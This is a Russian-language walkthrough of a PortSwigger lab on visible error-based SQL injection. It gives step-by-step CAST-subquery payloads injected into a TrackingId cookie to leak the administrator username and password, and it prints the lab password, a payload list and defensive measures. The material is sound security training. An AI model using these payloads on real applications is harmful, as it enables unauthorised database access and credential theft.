# 📘 PortSwigger Lab 011: Visible Error-Based SQL Injection

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

---

# 📑 Содержание

- [📘 PortSwigger Lab 011: Visible Error-Based SQL Injection](#-portswigger-lab-011-visible-error-based-sql-injection)
- [📑 Содержание](#-содержание)
- [🎯 Цель](#-цель)
- [🧠 Теория](#-теория)
- [🔍 Шаг 1 — Подтверждение SQL Injection](#-шаг-1--подтверждение-sql-injection)
- [🔍 Шаг 2 — Исправление синтаксиса](#-шаг-2--исправление-синтаксиса)
- [🔍 Шаг 3 — Проверка выполнения подзапросов](#-шаг-3--проверка-выполнения-подзапросов)
- [🔍 Шаг 4 — Извлечение имени пользователя](#-шаг-4--извлечение-имени-пользователя)
- [🔍 Шаг 5 — Извлечение пароля](#-шаг-5--извлечение-пароля)
- [🔍 Шаг 6 — Вход под administrator](#-шаг-6--вход-под-administrator)
- [🧩 Использованные Payloads](#-использованные-payloads)
- [💥 Почему атака сработала](#-почему-атака-сработала)
- [🛡 Защита](#-защита)
- [🛠 Чеклист](#-чеклист)
- [⬆ Наверх](#-наверх)

---

<a id="goal"></a>
# 🎯 Цель

Получить пароль пользователя administrator через подробные сообщения об ошибках SQL и выполнить вход в приложение.

---

<a id="theory"></a>
# 🧠 Теория

В предыдущих Blind SQL Injection лабах пароль приходилось восстанавливать символ за символом.

В этой лабораторной работе приложение отображает подробные ошибки базы данных.

Это позволяет заставить СУБД самостоятельно раскрыть интересующие данные внутри сообщения об ошибке.

Ключевая идея:

```sql
CAST((SELECT username FROM users) AS int)
```

База пытается преобразовать строку в число и выводит значение внутри ошибки.

---

<a id="step1"></a>
# 🔍 Шаг 1 — Подтверждение SQL Injection

Добавляем одинарную кавычку:

```sql
TrackingId=value'
```

Получаем ошибку:

```text
Unterminated string literal
```

Вывод:

```text
✓ SQL Injection присутствует
✓ Используются одинарные кавычки
✓ Мы находимся внутри SQL строки
```

---

<a id="step2"></a>
# 🔍 Шаг 2 — Исправление синтаксиса

Добавляем комментарий:

```sql
TrackingId=value'--
```

Ошибка исчезает.

Почему это работает:

```text
Комментарий отрезает оставшуюся часть оригинального SQL-запроса.
```

---

<a id="step3"></a>
# 🔍 Шаг 3 — Проверка выполнения подзапросов

Проверяем выполнение CAST:

```sql
TrackingId=' AND 1=CAST((SELECT 1) AS int)--
```

Запрос выполняется успешно.

Вывод:

```text
✓ Подзапросы выполняются
✓ CAST доступен
✓ Можно извлекать данные через ошибки
```

---

<a id="step4"></a>
# 🔍 Шаг 4 — Извлечение имени пользователя

Запрос:

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Получаем ошибку:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

Почему это произошло:

```text
administrator невозможно преобразовать в число.
PostgreSQL выводит значение внутри ошибки.
```

---

<a id="step5"></a>
# 🔍 Шаг 5 — Извлечение пароля

Меняем username на password:

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

В сообщении об ошибке появляется пароль.

<details>
<summary>🔑 Показать пароль administrator</summary>

Username: administrator

Password: fbyqtqoo62b7fhko4ugj

</details>

---

<a id="step6"></a>
# 🔍 Шаг 6 — Вход под administrator

Переходим на страницу входа.

Используем найденные учетные данные.

Лаба успешно решена.

---

<a id="payloads"></a>
# 🧩 Использованные Payloads

Подтверждение SQLi:

```sql
'
```

Исправление запроса:

```sql
'--
```

Проверка CAST:

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

Получение пользователя:

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

Получение пароля:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

<a id="why"></a>
# 💥 Почему атака сработала

- TrackingId вставлялся напрямую в SQL.
- Использовались строковые конкатенации.
- База данных отображала подробные ошибки.
- CAST позволял выводить данные внутри сообщения об ошибке.

---

<a id="defense"></a>
# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Скрытие подробных ошибок БД
- Least Privilege
- WAF
- Логирование SQL ошибок

---

<a id="checklist"></a>
# 🛠 Чеклист

- [x] SQL Injection подтверждена
- [x] Подтверждено выполнение подзапросов
- [x] Извлечён username
- [x] Извлечён пароль
- [x] Выполнен вход под administrator

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
